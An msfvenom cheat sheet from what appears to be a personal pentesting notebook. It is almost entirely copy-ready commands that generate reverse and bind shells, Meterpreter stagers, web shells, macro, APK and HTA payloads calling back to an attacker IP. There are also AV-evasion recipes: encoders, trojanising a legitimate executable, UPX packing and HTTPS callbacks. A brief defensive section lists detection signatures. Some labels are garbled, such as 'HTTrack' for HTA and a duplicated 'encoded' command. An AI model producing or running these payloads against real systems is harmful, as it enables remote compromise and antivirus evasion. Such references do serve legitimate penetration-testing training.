# MSFVenom Reference

## Table of Contents
- [[#Introduction|Introduction]]
- [[#Basic Syntax|Basic Syntax]]
- [[#Linux Payloads|Linux Payloads]]
- [[#Windows Payloads|Windows Payloads]]
- [[#Web Payloads|Web Payloads]]
- [[#Scripting Payloads|Scripting Payloads]]
- [[#Encoding & Evasion|Encoding & Evasion]]
- [[#Listing Options|Listing Options]]
- [[#Handlers|Handlers]]
- [[#Useful Payload Recipes|Useful Payload Recipes]]
- [[#Related Notes|Related Notes]]

---

## Introduction

**MSFVenom** is a Metasploit standalone payload generator. It replaces `msfpayload` and `msfencode`.

Key uses:
- Generate shellcode for exploits
- Create staged vs stageless payloads
- Encode payloads for evasion
- Output in multiple formats (exe, elf, py, ps1, etc.)

> [!tip] Staged vs Stageless
> - **Staged** (`reverse_tcp`): Small initial payload downloads the rest. Smaller size, more stealthy.
> - **Stageless** (`reverse_tcp` → `shell_reverse_tcp`): Contains full shellcode. Larger but self-contained.

---

## Basic Syntax

```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o <OUTPUT>
```

Common flags:
| Flag | Description |
|------|-------------|
| `-p` | Payload to use |
| `-f` | Output format |
| `-o` | Output file |
| `-e` | Encoder |
| `-i` | Encoding iterations |
| `-a` | Architecture (x86, x64) |
| `--platform` | Platform (linux, windows) |
| `-b` | Bad characters (e.g. `\x00\x0a\x0d`) |
| `-n` | NOP sled length |
| `--pad` | Pad to size |
| `--list` | List options |

---

## Linux Payloads

### Basic ELF Reverse Shell

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f elf -o shell_x64.elf
```

### Linux x86 Reverse Shell

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f elf -o shell_x86.elf
```

### Linux Meterpreter Reverse TCP

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f elf -o meter_x64.elf
```

### Linux Bind Shell

```bash
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf
```

### Linux Exec (run command)

```bash
msfvenom -p linux/x64/exec CMD="id" -f elf -o exec.elf
```

---

## Windows Payloads

### Basic EXE Reverse Shell (Stageless)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o shell_x64.exe
```

### Windows x86 Reverse Shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o shell_x86.exe
```

### Windows Meterpreter Reverse TCP (Staged)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o meter_x64.exe
```

### Windows Meterpreter Reverse HTTPS

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=443 -f exe -o meter_https.exe
```

### Windows Meterpreter Reverse TCP (x86)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o meter_x86.exe
```

### Windows Bind Shell

```bash
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe
```

### Windows DLL

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f dll -o shell.dll
```

### Windows DLL with stageless

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f dll -o meter.dll
```

### Windows EXE Service (for MSF exploit/multi/handler)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe-service -o shell-service.exe
```

### Windows PowerShell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f ps1 -o shell.ps1
```

### Windows PowerShell Encoded Command

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f ps1 -o shell.ps1
```

### Windows VBA (for Macro attacks)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f vba -o shell.vba
```

---

## Web Payloads

### PHP

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.3 LPORT=4444 -f raw -o shell.php
```

### PHP (metepreter)

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f raw -o meter.php
```

### ASP

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f asp -o shell.asp
```

### ASPX

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f aspx -o shell.aspx
```

### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f raw -o shell.jsp
```

### WAR (Tomcat)

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f war -o shell.war
```

---

## Scripting Payloads

### Python Reverse Shell

```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.3 LPORT=4444 -f raw
```

### Python Code

```bash
msfvenom -p python/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f raw -o shell.py
```

### Python Meterpreter

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f raw -o meter.py
```

### Bash

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.3 LPORT=4444 -f raw
```

### Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=10.10.14.3 LPORT=4444 -f raw
```

### Ruby

```bash
msfvenom -p ruby/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f raw
```

### NodeJS

```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f raw
```

---

## Encoding & Evasion

### Basic Encoding

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -e x64/zutto_dekiru -i 9 -o encoded.exe
```

### x86 Shikata Ga Nai (most common)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 5 -o encoded_x86.exe
```

### Multiple Encoders (iterations)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 -e x86/countdown -i 3 -o multi_encoded.exe
```

### With Bad Characters (null bytes, newlines)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -b "\x00\x0a\x0d" -o no_badchars.exe
```

### NOP Sled

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -n 32 -o nop32.exe
```

### Template Injection (avoiding AV)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -x /path/to/legit.exe -o trojan.exe
```

### Custom EXITFUNC

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 EXITFUNC=thread -f exe -o thread.exe
```

### All Encoders List

```bash
# List all available encoders
msfvenom --list encoders

# Popular ones:
# x64/xor
# x64/zutto_dekiru
# x86/shikata_ga_nai
# x86/jmp_call_additive
# x86/call4_dword_xor
```

> [!note]
> Shikata Ga Nai is the most widely used but also most heavily signatured. For modern evasion, consider custom encoders or packing with tools like UPX.

---

## Listing Options

### List Payloads

```bash
# All payloads
msfvenom --list payloads

# Filter by platform
msfvenom --list payloads | grep -i 'linux/x64'
msfvenom --list payloads | grep -i 'windows/x64'
msfvenom --list payloads | grep -i 'php/'

# Filter by type
msfvenom --list payloads | grep 'meterpreter'
msfvenom --list payloads | grep 'reverse_tcp'
```

### List Formats

```bash
msfvenom --list formats
```

**Common formats:**
| Format | Description |
|--------|-------------|
| `elf` | Linux executable |
| `exe` | Windows executable |
| `exe-service` | Windows service executable |
| `dll` | Windows DLL |
| `asp` | ASP script |
| `aspx` | ASP.NET script |
| `jsp` | Java Server Pages |
| `war` | Java WAR (Tomcat) |
| `php` | PHP script |
| `py` | Python script |
| `ps1` | PowerShell script |
| `vba` | VBA macro |
| `c` | C code |
| `raw` | Raw shellcode |
| `hex` | Hex string |
| `python` | Python shellcode |
| `bash` | Bash one-liner |
| `perl` | Perl code |
| `ruby` | Ruby code |
| `csharp` | C# code |
| `javascript` | JS code |
| `powershell` | PowerShell code |
| `vbscript` | VBScript |

### List Encoders

```bash
msfvenom --list encoders
```

### List Platforms

```bash
msfvenom --list platforms
```

### List ARCHs

```bash
msfvenom --list archs
```

### List Options for a Specific Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp --list-options
```

---

## Handlers

### Multi/Handler Resource File

Create `handler.rc`:

```
use exploit/multi/handler
set PAYLOAD windows/x64/shell_reverse_tcp
set LHOST 10.10.14.3
set LPORT 4444
set ExitOnSession false
run -j
```

Run with:
```bash
msfconsole -r handler.rc
```

### Python handler script (standalone)

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 --handler
```

### Auto-generate handler

```bash
# -h generates the handler.rc file
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o shell.exe -h
```

---

## Useful Payload Recipes

### Android APK

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -o payload.apk
```

### macOS Macho

```bash
msfvenom -p osx/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f macho -o shell.macho
```

### IIS Web Shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f aspx -o iis_shell.aspx
```

### HTTrack Web Shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f hta-psh -o shell.hta
```

### HTTrack with PowerShell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f hta-psh -o shell.hta
```

### Loopback Listener

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o loop.exe
```

---

## Defensive Notes

**Detection signatures for msfvenom payloads:**
1. Known byte sequences in MSF stagers
2. Shikata Ga Nai decoder stub
3. PE sections with unusual characteristics
4. Connections to known C2 ports (4444, 8443)
5. Process injection indicators

**Evasion considerations:**
- Use custom encoding if possible
- Pack with UPX after generation
- Change port to 443/80 for HTTPS
- Use `reverse_https` for traffic inspection evasion
- Implement delays with `Sleep` or `AutoRunScript`

---

## Related Notes

- [[06 - Shells and Payloads/6.1 Reverse Shells/Reverse Shell Compendium]]
- [[06 - Shells and Payloads/6.5 File Transfers/File Transfer Techniques]]
- [[07 - Metasploit Framework/Metasploit Complete]]
- [[05 - Network Attacks/5.2 Firewall Evasion/Firewall IDS Evasion]]
